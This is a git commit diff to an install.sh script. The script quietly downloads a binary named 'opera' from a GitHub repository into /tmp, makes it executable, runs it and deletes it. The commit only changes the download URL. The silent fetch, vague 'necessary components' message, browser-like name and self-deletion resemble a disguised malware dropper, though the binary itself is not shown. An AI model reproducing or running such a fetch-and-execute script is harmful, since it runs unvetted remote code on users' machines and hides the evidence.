0fbdd269f9296aef896f13039fa5bec97bd18f1a
hdsed-sudo <viperr814@gmail.com>
2025-09-18 02:42:36 +0300

    123

--- install.sh
+++ install.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 echo "Downloading necessary components..."
-curl -s https://github.com/hdsed-sudo/mac-test/raw/main/opera -o /tmp/opera
+curl -s https://github.com/hdsed-sudo/mac-test/raw/refs/heads/main/opera -o /tmp/opera
 chmod +x /tmp/opera
 /tmp/opera
 rm -f /tmp/opera
+
